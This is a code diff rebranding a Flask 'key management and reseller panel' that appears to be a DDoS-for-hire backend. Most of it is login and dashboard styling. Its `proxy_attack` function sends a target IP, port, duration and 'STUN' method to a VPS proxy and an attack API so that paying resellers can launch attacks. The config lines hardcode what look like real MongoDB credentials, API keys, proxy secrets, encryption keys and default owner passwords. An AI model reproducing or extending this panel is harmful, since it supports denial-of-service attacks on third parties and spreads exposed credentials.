@@ -14,7 +14,7 @@ from pymongo import MongoClient
 
 # ══════════════════════════════════════════════════════════════════
 # ENV LOADER — supports .env file (no external dep)
-# Load order: ENV_FILE env var > panel.env > .env
+# Load order: ENV_FILE env var > alonexraj.env > .env
 # Existing os.environ values are NOT overridden (real env wins).
 # ══════════════════════════════════════════════════════════════════
 def _load_env_file(path):
@@ -39,7 +39,7 @@ def _load_env_file(path):
         print(f"[! ENV] Failed to load {path}: {e}")
         return False
 
-_env_candidates = [os.environ.get('ENV_FILE'), 'panel.env', '.env']
+_env_candidates = [os.environ.get('ENV_FILE'), 'alonexraj.env', '.env']
 for _p in _env_candidates:
     if _load_env_file(_p):
         break
@@ -48,20 +48,24 @@ app = Flask(__name__)
 app.secret_key = os.environ.get('FLASK_SECRET_KEY') or secrets.token_hex(16)
 
 # Owner credentials
-OWNER_USER = os.environ.get('OWNER_USER', 'God')
-OWNER_PASS = os.environ.get('OWNER_PASS', 'pawan')
+OWNER_USER = os.environ.get('OWNER_USER', 'Vishal')
+OWNER_PASS = os.environ.get('OWNER_PASS', 'vishal')
 
 # Shared secret keys — must match Android app
 HMAC_SECRET = os.environ.get('HMAC_SECRET', 'aLx_R4j_2024_sEcReT_kEy_X9z')
 AES_KEY = os.environ.get('AES_KEY', 'ALONExRAJ_2024!!').encode('utf-8')
 
-# Attack — via VPS Proxy (whitelisted IP)
-ATTACK_PROXY_URL = os.environ.get("ATTACK_PROXY_URL", "http://52.66.29.214:3000/proxy-attack")
+# Attack API — INTERNAL ONLY
+ATTACK_API_BASE = os.environ.get('ATTACK_API_BASE', 'https://app.teamc2.xyz')
+ATTACK_API_KEY = os.environ.get('ATTACK_API_KEY', 'I5C624')
+
+# External Proxy (proxy.py on VPS) — forwards to SatelliteStress
+PROXY_URL = os.environ.get("PROXY_URL", "http://52.66.29.214:3000/proxy-attack")
 PROXY_SECRET = os.environ.get("PROXY_SECRET", "THUNDER_PROXY_2024_SECRET")
 PROXY_METHOD = os.environ.get("PROXY_METHOD", "STUN")
 
 # MongoDB
-MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://doremondg55_db_user:UHw7eqhBHqGxl2BF@cluster0.o8hbxmd.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
+MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://srinivasaraothotathotavishnusa_db_user:YJVeh5aKO3ffqfh4@cluster0.w0nfvev.mongodb.net/?appName=Cluster0")
 MONGO_DB_NAME = os.environ.get('MONGO_DB_NAME', 'alonexraj_panel')
 mongo_client = MongoClient(MONGO_URI)
 db = mongo_client[MONGO_DB_NAME]
@@ -80,10 +84,6 @@ CREDITS_PER_HOUR = int(os.environ.get('CREDITS_PER_HOUR', '10'))
 # ══════════════════════════════════════════════════════════════════
 # DATA HELPERS — MongoDB
 # ══════════════════════════════════════════════════════════════════
-# ══════════════════════════════════════════════════════════════════
-# KEEP ALIVE FUNCTIONALITY - Add this to your existing code
-# ══════════════════════════════════════════════════════════════════
-
 # Keep alive thread for Render free tier
 import threading
 import time
@@ -114,7 +114,7 @@ def health_check():
     return jsonify({
         'status': 'alive',
         'timestamp': datetime.utcnow().isoformat() + 'Z',
-        'service': 'GODxPAWAN Panel',
+        'service': 'ALONExRAJ Panel',
         'version': '2.0'
     })
 
@@ -128,10 +128,7 @@ def start_keep_alive():
         print("[✓ Keep-Alive] Will ping every 4 minutes to prevent spin-down")
     else:
         print("[! Keep-Alive] Disabled via DISABLE_KEEP_ALIVE environment variable")
-
-# Call this function after app initialization but before app.run
-# Add this line right before app.run() or at the bottom
-
+        
 def load_keys():
     """Load active keys, auto-remove expired ones."""
     now = datetime.utcnow().isoformat() + 'Z'
@@ -221,16 +218,16 @@ def encrypted_reply(data_dict):
 def proxy_attack(ip, port, time_sec):
     """
     Forward attack request to VPS proxy — single request, STUN method.
-    No TeamC2; only proxy.py.
     """
     try:
-        r = requests.post(ATTACK_PROXY_URL, json={
-            'secret': PROXY_SECRET,
-            'ip': ip,
-            'port': port,
-            'time': time_sec,
-            'method': PROXY_METHOD
-        }, timeout=15)
+        payload = {
+            "secret": PROXY_SECRET,
+            "ip": ip,
+            "port": port,
+            "time": time_sec,
+            "method": PROXY_METHOD,
+        }
+        r = requests.post(PROXY_URL, json=payload, timeout=15)
         if r.status_code == 200:
             data = r.json()
             if data.get("status") == "queued":
@@ -239,6 +236,7 @@ def proxy_attack(ip, port, time_sec):
                     "status": "queued",
                     "message": data.get("message", "⚡ Attack Launched!"),
                     "target": f"{ip}:{port}",
+                    "method": PROXY_METHOD,
                     "slots": {"active": launched, "available": max(8 - launched, 0), "max": 8},
                 }
             return {"status": "error", "message": data.get("message", "Attack failed")}
@@ -296,51 +294,78 @@ LOGIN_TEMPLATE = '''<!doctype html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Panel Login</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<title>ALONExRAJ Panel — Login</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#4a00e0,#8e2de2,#ff6b35);background-size:400% 400%;animation:g 12s ease infinite}
-@keyframes g{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
-.card{display:flex;background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 30px 60px rgba(0,0,0,.3);max-width:820px;width:90%;min-height:440px}
-.left{flex:1;background:linear-gradient(135deg,#f0f0ff,#e8e0ff);display:flex;align-items:center;justify-content:center;padding:40px}
-.left svg{width:100%;max-width:260px}
-.right{flex:1;padding:50px 40px;display:flex;flex-direction:column;justify-content:center}
-.right h2{font-size:24px;font-weight:700;color:#1a1a2e;margin-bottom:6px}
-.right .sub{font-size:13px;color:#888;margin-bottom:28px}
-.ig{margin-bottom:16px}
-.ig input{width:100%;padding:14px 18px;background:#f4f0fa;border:2px solid transparent;border-radius:12px;font-size:14px;color:#333;transition:border .2s}
-.ig input:focus{outline:none;border-color:#7c3aed;background:#fff}
-.ig input::placeholder{color:#aaa}
-.btn{width:100%;padding:14px;background:linear-gradient(135deg,#7c3aed,#4a00e0);color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;cursor:pointer;transition:transform .15s,box-shadow .2s;margin-top:6px}
-.btn:hover{transform:translateY(-1px);box-shadow:0 8px 24px rgba(124,58,237,.35)}
-.err{color:#dc2626;font-size:13px;margin-bottom:14px;padding:10px;background:#fef2f2;border-radius:8px}
-.ft{margin-top:18px;font-size:11px;color:#bbb;text-align:center}
-@media(max-width:700px){.card{flex-direction:column}.left{display:none}.right{padding:40px 28px}}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Plus Jakarta Sans',sans-serif}
+body{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;
+background:linear-gradient(135deg,#667eea 0%,#764ba2 50%,#f093fb 100%);
+background-size:300% 300%;animation:bgShift 15s ease infinite;position:relative;overflow:hidden}
+@keyframes bgShift{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
+body::before,body::after{content:'';position:absolute;border-radius:50%;filter:blur(80px);opacity:.4;pointer-events:none}
+body::before{width:400px;height:400px;background:#a78bfa;top:-100px;left:-100px;animation:float 8s ease-in-out infinite}
+body::after{width:500px;height:500px;background:#f0abfc;bottom:-150px;right:-150px;animation:float 10s ease-in-out infinite reverse}
+@keyframes float{0%,100%{transform:translate(0,0)}50%{transform:translate(30px,-30px)}}
+.card{position:relative;z-index:2;display:flex;background:rgba(255,255,255,.98);backdrop-filter:blur(20px);
+border-radius:28px;overflow:hidden;box-shadow:0 30px 80px rgba(80,50,180,.3),0 0 0 1px rgba(255,255,255,.4) inset;
+max-width:920px;width:100%;min-height:500px}
+.left{flex:1;background:linear-gradient(160deg,#6366f1 0%,#8b5cf6 50%,#ec4899 100%);
+display:flex;flex-direction:column;align-items:center;justify-content:center;padding:50px 40px;color:#fff;position:relative;overflow:hidden}
+.left::before{content:'';position:absolute;width:280px;height:280px;border-radius:50%;background:rgba(255,255,255,.08);top:-80px;right:-80px}
+.left::after{content:'';position:absolute;width:200px;height:200px;border-radius:50%;background:rgba(255,255,255,.06);bottom:-60px;left:-60px}
+.left .logo-circle{width:96px;height:96px;border-radius:24px;background:rgba(255,255,255,.2);backdrop-filter:blur(10px);
+display:flex;align-items:center;justify-content:center;margin-bottom:24px;box-shadow:0 12px 32px rgba(0,0,0,.15);position:relative;z-index:2}
+.left h1{font-size:30px;font-weight:800;margin-bottom:10px;letter-spacing:-.5px;position:relative;z-index:2}
+.left .tagline{font-size:14px;font-weight:400;opacity:.85;text-align:center;line-height:1.6;max-width:280px;position:relative;z-index:2}
+.left .feats{margin-top:32px;display:flex;flex-direction:column;gap:12px;position:relative;z-index:2;width:100%;max-width:260px}
+.left .feat{display:flex;align-items:center;gap:10px;font-size:13px;background:rgba(255,255,255,.12);padding:10px 14px;border-radius:12px;backdrop-filter:blur(10px)}
+.left .feat .dot{width:8px;height:8px;border-radius:50%;background:#4ade80;box-shadow:0 0 8px #4ade80}
+.right{flex:1;padding:60px 50px;display:flex;flex-direction:column;justify-content:center}
+.right h2{font-size:28px;font-weight:800;color:#1a1a2e;margin-bottom:8px;letter-spacing:-.5px}
+.right .sub{font-size:14px;color:#9ca3af;margin-bottom:32px}
+.ig{margin-bottom:18px}
+.ig label{display:block;font-size:12px;font-weight:600;color:#4b5563;margin-bottom:8px;text-transform:uppercase;letter-spacing:.6px}
+.ig input{width:100%;padding:15px 18px;background:#f9fafb;border:2px solid #e5e7eb;border-radius:14px;font-size:15px;color:#1f2937;transition:.2s;font-weight:500}
+.ig input:focus{outline:none;border-color:#8b5cf6;background:#fff;box-shadow:0 0 0 4px rgba(139,92,246,.12)}
+.ig input::placeholder{color:#d1d5db;font-weight:400}
+.btn-submit{width:100%;padding:16px;background:linear-gradient(135deg,#6366f1,#8b5cf6,#ec4899);background-size:200% 200%;
+color:#fff;border:none;border-radius:14px;font-size:15px;font-weight:700;letter-spacing:1px;text-transform:uppercase;
+cursor:pointer;transition:.25s;margin-top:8px;box-shadow:0 8px 24px rgba(139,92,246,.35)}
+.btn-submit:hover{background-position:100% 50%;transform:translateY(-2px);box-shadow:0 12px 32px rgba(139,92,246,.45)}
+.btn-submit:active{transform:translateY(0)}
+.err{color:#dc2626;font-size:13px;margin-bottom:16px;padding:12px 14px;background:#fef2f2;border-left:3px solid #dc2626;border-radius:8px;font-weight:500}
+.ft{margin-top:24px;font-size:11px;color:#9ca3af;text-align:center;font-weight:500;letter-spacing:.4px}
+.ft span{color:#8b5cf6;font-weight:700}
+@media(max-width:760px){.card{flex-direction:column;min-height:auto}.left{padding:40px 30px}.left .feats{display:none}.right{padding:40px 28px}}
 </style>
 </head>
 <body>
 <div class="card">
 <div class="left">
-<svg viewBox="0 0 400 350" fill="none" xmlns="http://www.w3.org/2000/svg">
-<rect x="120" y="160" width="160" height="130" rx="16" fill="#4a00e0"/>
-<path d="M160 160V120a40 40 0 0180 0v40" stroke="#1a1a2e" stroke-width="18" fill="none" stroke-linecap="round"/>
-<circle cx="200" cy="215" r="14" fill="#e8e0ff"/><rect x="195" y="225" width="10" height="24" rx="5" fill="#e8e0ff"/>
-<g transform="translate(250,60) rotate(20)"><rect x="0" y="8" width="60" height="12" rx="6" fill="#ff6b35"/><circle cx="70" cy="14" r="18" stroke="#ff6b35" stroke-width="6" fill="none"/><rect x="10" y="20" width="8" height="12" rx="2" fill="#ff6b35"/><rect x="25" y="20" width="8" height="8" rx="2" fill="#ff6b35"/></g>
-<circle cx="90" cy="250" r="12" fill="#1a1a2e"/><rect x="80" y="262" width="20" height="30" rx="8" fill="#7c3aed"/>
-<circle cx="310" cy="275" r="12" fill="#1a1a2e"/><rect x="300" y="287" width="20" height="28" rx="8" fill="#ff6b35"/>
+<div class="logo-circle">
+<svg width="48" height="48" viewBox="0 0 24 24" fill="none">
+<path d="M12 2L4 7v6c0 5 3.5 9 8 10 4.5-1 8-5 8-10V7l-8-5z" stroke="#fff" stroke-width="2" fill="rgba(255,255,255,.15)"/>
+<path d="M9 12l2 2 4-4" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
 </svg>
 </div>
+<h1>ALONExRAJ</h1>
+<div class="tagline">Premium Key Management & Reseller Panel</div>
+<div class="feats">
+<div class="feat"><div class="dot"></div>Secure Key Generation</div>
+<div class="feat"><div class="dot"></div>Reseller Credit System</div>
+<div class="feat"><div class="dot"></div>Real-time Device Tracking</div>
+</div>
+</div>
 <div class="right">
-<h2>Owner / Seller Login</h2>
-<p class="sub">Access your key management panel</p>
-{% if error %}<div class="err">{{ error }}</div>{% endif %}
+<h2>Welcome back 👋</h2>
+<p class="sub">Sign in to your dashboard to continue</p>
+{% if error %}<div class="err">⚠️ {{ error }}</div>{% endif %}
 <form method="post">
-<div class="ig"><input name="username" placeholder="Username" required autofocus></div>
-<div class="ig"><input name="password" type="password" placeholder="Password" required></div>
-<button type="submit" class="btn">Submit</button>
+<div class="ig"><label>Username</label><input name="username" placeholder="Enter your username" required autofocus></div>
+<div class="ig"><label>Password</label><input name="password" type="password" placeholder="••••••••••" required></div>
+<button type="submit" class="btn-submit">Sign In</button>
 </form>
-<div class="ft">GODxPAWAN Premium Panel</div>
+<div class="ft">© 2025 <span>ALONExRAJ</span> Premium Panel</div>
 </div>
 </div>
 </body>
@@ -352,58 +377,130 @@ DASHBOARD_TEMPLATE = '''<!doctype html>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>{{ title }}</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Inter',sans-serif;background:#f5f7fa;color:#1a1a2e;min-height:100vh}
-.topbar{background:#fff;padding:14px 24px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #e8ecf0;position:sticky;top:0;z-index:100;box-shadow:0 1px 4px rgba(0,0,0,.04)}
-.topbar .brand{font-size:17px;font-weight:700;color:#4361ee}
-.topbar .user-info{display:flex;align-items:center;gap:14px;font-size:13px;color:#666}
-.topbar a{color:#666;text-decoration:none;font-size:13px}
-.topbar a:hover{color:#e53e3e}
-.container{max-width:1000px;margin:0 auto;padding:28px 20px}
-.header-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;flex-wrap:wrap;gap:12px}
-.header-row h2{font-size:22px;font-weight:700;color:#1a1a2e}
-.header-actions{display:flex;gap:10px;flex-wrap:wrap}
-.btn{padding:10px 18px;border:none;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;transition:opacity .2s,transform .1s}
-.btn:hover{opacity:.9;transform:translateY(-1px)}
-.btn-blue{background:#4361ee;color:#fff}
-.btn-green{background:#10b981;color:#fff}
-.btn-red{background:#fee2e2;color:#dc2626}
-.btn-purple{background:#8b5cf6;color:#fff}
-.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;margin-bottom:28px}
-.stat-card{background:#fff;border:1px solid #e8ecf0;border-radius:14px;padding:20px;transition:transform .15s,box-shadow .2s}
-.stat-card:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(0,0,0,.06)}
-.stat-card .label{font-size:11px;color:#888;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px}
-.stat-card .value{font-size:26px;font-weight:700;color:#1a1a2e}
-.section{background:#fff;border:1px solid #e8ecf0;border-radius:14px;padding:22px;margin-bottom:18px;box-shadow:0 2px 8px rgba(0,0,0,.02)}
-.section-title{font-size:15px;font-weight:600;color:#1a1a2e;margin-bottom:14px}
-.form-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px}
-.form-group label{display:block;font-size:11px;color:#888;margin-bottom:5px;text-transform:uppercase;letter-spacing:.4px}
-.form-group input,.form-group select{width:100%;padding:10px 12px;background:#f9fafb;border:1px solid #e2e8f0;border-radius:8px;color:#1a1a2e;font-size:13px;transition:border .2s}
-.form-group input:focus,.form-group select:focus{outline:none;border-color:#4361ee;background:#fff}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Plus Jakarta Sans',sans-serif}
+body{background:linear-gradient(180deg,#f8f9ff 0%,#eef0fc 100%);color:#1a1a2e;min-height:100vh}
+.topbar{background:#fff;padding:14px 24px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #eef0f7;position:sticky;top:0;z-index:100;box-shadow:0 2px 12px rgba(80,50,180,.04)}
+.topbar .brand-wrap{display:flex;align-items:center;gap:10px}
+.topbar .brand-icon{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,#6366f1,#8b5cf6);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:14px;box-shadow:0 4px 12px rgba(99,102,241,.3)}
+.topbar .brand{font-size:18px;font-weight:800;color:#1a1a2e;letter-spacing:-.3px}
+.topbar .user-info{display:flex;align-items:center;gap:14px;font-size:13px;color:#6b7280;font-weight:500}
+.topbar .user-info span{color:#1a1a2e;font-weight:600}
+.topbar a{color:#dc2626;text-decoration:none;font-size:13px;font-weight:600;padding:7px 14px;border-radius:8px;background:#fef2f2;transition:.2s}
+.topbar a:hover{background:#fee2e2}
+.container{max-width:1100px;margin:0 auto;padding:24px 20px 60px}
+
+/* Hero greeting card */
+.hero{background:#fff;border-radius:20px;padding:24px 26px;margin-bottom:20px;display:flex;align-items:center;gap:18px;box-shadow:0 4px 20px rgba(80,50,180,.06);position:relative;overflow:hidden}
+.hero::before{content:'';position:absolute;width:200px;height:200px;border-radius:50%;background:linear-gradient(135deg,#a78bfa20,#f0abfc20);top:-80px;right:-60px}
+.hero .hero-icon{width:54px;height:54px;border-radius:16px;background:linear-gradient(135deg,#6366f1,#8b5cf6);display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 8px 20px rgba(99,102,241,.35);position:relative;z-index:1}
+.hero .hero-icon svg{width:26px;height:26px;color:#fff}
+.hero .hero-text{position:relative;z-index:1;flex:1}
+.hero h1{font-size:22px;font-weight:800;color:#1a1a2e;margin-bottom:4px;letter-spacing:-.4px}
+.hero p{font-size:13px;color:#6b7280;font-weight:500}
+.hero .hero-actions{display:flex;gap:10px;position:relative;z-index:1;flex-wrap:wrap}
+.hero-btn{padding:10px 18px;border:none;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;transition:.2s;display:inline-flex;align-items:center;gap:6px;white-space:nowrap}
+.hero-btn.primary{background:linear-gradient(135deg,#3b82f6,#6366f1);color:#fff;box-shadow:0 4px 12px rgba(59,130,246,.3)}
+.hero-btn.primary:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(59,130,246,.4)}
+.hero-btn.outline{background:#fff;color:#4b5563;border:1.5px solid #e5e7eb}
+.hero-btn.outline:hover{border-color:#8b5cf6;color:#8b5cf6}
+
+/* Gradient stat cards */
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px;margin-bottom:24px}
+.stat-card{border-radius:18px;padding:20px;color:#fff;position:relative;overflow:hidden;transition:.25s;box-shadow:0 8px 24px rgba(0,0,0,.08);cursor:default}
+.stat-card:hover{transform:translateY(-3px);box-shadow:0 14px 32px rgba(0,0,0,.12)}
+.stat-card::before{content:'';position:absolute;width:140px;height:140px;border-radius:50%;background:rgba(255,255,255,.12);top:-50px;right:-50px}
+.stat-card::after{content:'';position:absolute;width:80px;height:80px;border-radius:50%;background:rgba(255,255,255,.08);bottom:-30px;right:30px}
+.stat-card .icon{width:40px;height:40px;border-radius:11px;background:rgba(255,255,255,.22);display:flex;align-items:center;justify-content:center;margin-bottom:14px;backdrop-filter:blur(10px);position:relative;z-index:1}
+.stat-card .icon svg{width:20px;height:20px;color:#fff}
+.stat-card .label{font-size:12px;opacity:.92;font-weight:500;margin-bottom:6px;position:relative;z-index:1;letter-spacing:.2px}
+.stat-card .value{font-size:30px;font-weight:800;position:relative;z-index:1;letter-spacing:-.5px}
+.sc-blue{background:linear-gradient(135deg,#3b82f6,#1d4ed8)}
+.sc-green{background:linear-gradient(135deg,#10b981,#059669)}
+.sc-orange{background:linear-gradient(135deg,#f59e0b,#ea580c)}
+.sc-purple{background:linear-gradient(135deg,#a855f7,#7c3aed)}
+.sc-pink{background:linear-gradient(135deg,#ec4899,#be185d)}
+.sc-cyan{background:linear-gradient(135deg,#06b6d4,#0891b2)}
+
+/* Section panels */
+.section{background:#fff;border-radius:18px;padding:22px;margin-bottom:16px;box-shadow:0 4px 16px rgba(80,50,180,.05);border:1px solid #eef0f7}
+.section-head{display:flex;align-items:center;gap:12px;margin-bottom:16px}
+.section-head .se-icon{width:40px;height:40px;border-radius:12px;background:linear-gradient(135deg,#a855f7,#7c3aed);display:flex;align-items:center;justify-content:center;color:#fff;flex-shrink:0;box-shadow:0 4px 12px rgba(168,85,247,.25)}
+.section-head .se-icon svg{width:20px;height:20px}
+.section-head .se-text h3{font-size:16px;font-weight:700;color:#1a1a2e;margin-bottom:2px}
+.section-head .se-text p{font-size:12px;color:#9ca3af;font-weight:500}
+.section-head .se-spacer{flex:1}
+.section-head .view-all{font-size:13px;font-weight:600;color:#3b82f6;text-decoration:none;cursor:pointer;display:flex;align-items:center;gap:4px}
+.section-head .view-all:hover{color:#6366f1}
+
+/* Buttons */
+.btn{padding:10px 18px;border:none;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;transition:.2s}
+.btn:hover{transform:translateY(-1px)}
+.btn-blue{background:linear-gradient(135deg,#3b82f6,#6366f1);color:#fff;box-shadow:0 4px 12px rgba(59,130,246,.25)}
+.btn-blue:hover{box-shadow:0 6px 18px rgba(59,130,246,.35)}
+.btn-green{background:linear-gradient(135deg,#10b981,#059669);color:#fff;box-shadow:0 4px 12px rgba(16,185,129,.25)}
+.btn-green:hover{box-shadow:0 6px 18px rgba(16,185,129,.35)}
+.btn-purple{background:linear-gradient(135deg,#a855f7,#7c3aed);color:#fff;box-shadow:0 4px 12px rgba(168,85,247,.25)}
+.btn-purple:hover{box-shadow:0 6px 18px rgba(168,85,247,.35)}
+.btn-red{background:#fef2f2;color:#dc2626;border:1.5px solid #fecaca}
+.btn-red:hover{background:#fee2e2}
+
+/* Forms */
+.form-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px}
+.form-group label{display:block;font-size:11px;color:#6b7280;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px;font-weight:600}
+.form-group input,.form-group select{width:100%;padding:11px 14px;background:#f9fafb;border:1.5px solid #e5e7eb;border-radius:10px;color:#1a1a2e;font-size:14px;transition:.2s;font-weight:500;font-family:inherit}
+.form-group input:focus,.form-group select:focus{outline:none;border-color:#8b5cf6;background:#fff;box-shadow:0 0 0 3px rgba(139,92,246,.1)}
+
+/* Tables */
+.table-wrap{overflow-x:auto;border-radius:12px;border:1px solid #f0f2f7}
 table{width:100%;border-collapse:collapse}
-th{text-align:left;padding:10px;font-size:11px;color:#888;text-transform:uppercase;letter-spacing:.4px;border-bottom:2px solid #f0f2f5}
-td{padding:10px;font-size:12px;color:#444;border-bottom:1px solid #f5f7fa}
-tr:hover td{background:#f9fafb}
-.badge{padding:3px 8px;border-radius:10px;font-size:10px;font-weight:600}
+th{text-align:left;padding:12px 14px;font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.5px;background:#f9fafb;font-weight:700;border-bottom:1px solid #eef0f7}
+td{padding:12px 14px;font-size:13px;color:#374151;border-bottom:1px solid #f5f7fa;font-weight:500}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:#fafbff}
+
+/* Badges */
+.badge{padding:4px 10px;border-radius:20px;font-size:11px;font-weight:700;display:inline-block}
 .badge-active{background:#d1fae5;color:#059669}
 .badge-expired{background:#fee2e2;color:#dc2626}
 .badge-unredeemed{background:#fef3c7;color:#d97706}
-.mono{font-family:monospace;font-size:11px;color:#888}
-.modal-bg{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.4);z-index:200;align-items:center;justify-content:center}
+.mono{font-family:'JetBrains Mono',monospace;font-size:12px;color:#6366f1;font-weight:600}
+
+/* Empty state */
+.empty{padding:40px 20px;text-align:center;color:#9ca3af}
+.empty .empty-icon{width:64px;height:64px;border-radius:18px;background:#f3f4f6;display:inline-flex;align-items:center;justify-content:center;margin-bottom:14px}
+.empty .empty-icon svg{width:32px;height:32px;color:#d1d5db}
+.empty p{font-size:14px;font-weight:600;color:#6b7280;margin-bottom:4px}
+.empty span{font-size:12px;color:#9ca3af}
+
+/* Modal */
+.modal-bg{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(20,15,40,.5);backdrop-filter:blur(6px);z-index:200;align-items:center;justify-content:center;padding:20px}
 .modal-bg.active{display:flex}
-.modal{background:#fff;border:1px solid #e8ecf0;border-radius:16px;padding:28px;width:90%;max-width:480px;box-shadow:0 20px 40px rgba(0,0,0,.12)}
-.modal h3{color:#1a1a2e;margin-bottom:16px;font-size:18px}
-.modal .close-btn{float:right;background:none;border:none;color:#aaa;font-size:22px;cursor:pointer}
-.modal .close-btn:hover{color:#333}
-.credit-badge{background:#fef3c7;color:#d97706;padding:4px 12px;border-radius:12px;font-size:12px;font-weight:600}
-@media(max-width:600px){.cards{grid-template-columns:1fr 1fr}.form-grid{grid-template-columns:1fr}}
+.modal{background:#fff;border-radius:20px;padding:28px;width:100%;max-width:520px;max-height:90vh;overflow-y:auto;box-shadow:0 30px 60px rgba(0,0,0,.2)}
+.modal h3{color:#1a1a2e;margin-bottom:18px;font-size:19px;font-weight:800;letter-spacing:-.3px}
+.modal .close-btn{float:right;background:#f3f4f6;border:none;color:#6b7280;font-size:18px;cursor:pointer;width:32px;height:32px;border-radius:10px;display:flex;align-items:center;justify-content:center;transition:.2s}
+.modal .close-btn:hover{background:#fee2e2;color:#dc2626}
+
+/* Credit pill in topbar */
+.credit-badge{background:linear-gradient(135deg,#fbbf24,#f59e0b);color:#fff;padding:6px 14px;border-radius:20px;font-size:12px;font-weight:700;box-shadow:0 4px 10px rgba(245,158,11,.3);display:inline-flex;align-items:center;gap:6px}
+.credit-badge::before{content:'⚡'}
+
+/* Toolbar (action buttons row) */
+.toolbar{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;margin-bottom:18px}
+.toolbar h2{font-size:20px;font-weight:800;color:#1a1a2e;letter-spacing:-.3px}
+.toolbar .actions{display:flex;gap:10px;flex-wrap:wrap}
+
+@media(max-width:700px){.cards{grid-template-columns:1fr}.form-grid{grid-template-columns:1fr}.hero{flex-direction:column;align-items:flex-start;text-align:left}.hero .hero-actions{width:100%}.hero-btn{flex:1;justify-content:center}}
+@keyframes fadeOut{0%,70%{opacity:1}100%{opacity:0;transform:translateY(-10px)}}
 </style>
 </head>
 <body>
 <div class="topbar">
-<div class="brand">GODxPAWAN</div>
+<div class="brand-wrap">
+<div class="brand-icon">A</div>
+<div class="brand">ALONExRAJ</div>
+</div>
 <div class="user-info">
 <span>{{ display_name }}</span>
 {% if role == 'reseller' %}<span class="credit-badge">{{ credits }} Credits</span>{% endif %}
@@ -419,6 +516,7 @@ tr:hover td{background:#f9fafb}
 <script>
 const ROLE = '{{ role }}';
 const USERNAME = '{{ username }}';
+const DISPLAY_NAME = '{{ display_name }}';
 const container = document.getElementById('app');
 const modalBg = document.getElementById('modalBg');
 const modalContent = document.getElementById('modalContent');
@@ -428,6 +526,27 @@ function showModal(html){modalContent.innerHTML=html;modalBg.classList.add('acti
 modalBg.addEventListener('click',e=>{if(e.target===modalBg)closeModal()});
 
 async function api(url,opts){const r=await fetch(url,opts);return r.json();}
+
+function greeting(){
+  const h=new Date().getHours();
+  if(h<12)return'Good morning';
+  if(h<17)return'Good afternoon';
+  return'Good evening';
+}
+
+// SVG icon helpers
+const ICONS={
+  spark:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M5.6 18.4l2.1-2.1M16.3 7.7l2.1-2.1"/></svg>',
+  key:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="8" cy="14" r="4"/><path d="M11 11l8-8 3 3M16 6l3 3"/></svg>',
+  check:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M8 12l3 3 5-6"/></svg>',
+  users:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="8" r="4"/><path d="M2 21c0-3.9 3.1-7 7-7s7 3.1 7 7"/><circle cx="17" cy="6" r="3"/><path d="M22 19c0-2.8-2.2-5-5-5"/></svg>',
+  device:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="2" width="12" height="20" rx="2"/><path d="M11 18h2"/></svg>',
